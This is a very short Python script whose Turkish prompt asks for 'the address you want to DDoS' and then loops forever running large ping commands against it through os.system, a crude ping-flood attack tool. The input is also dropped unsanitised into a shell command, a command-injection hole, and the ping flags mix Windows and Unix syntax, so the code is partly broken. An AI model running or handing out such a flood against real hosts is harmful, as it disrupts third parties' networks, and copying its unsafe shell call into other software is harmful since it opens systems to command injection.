import os 

adress = input(("Ddos atmak istediğiniz adresi girin?\n"))
while True:
    os.system("ping -n 1000 -s 9232   %s" % adress)
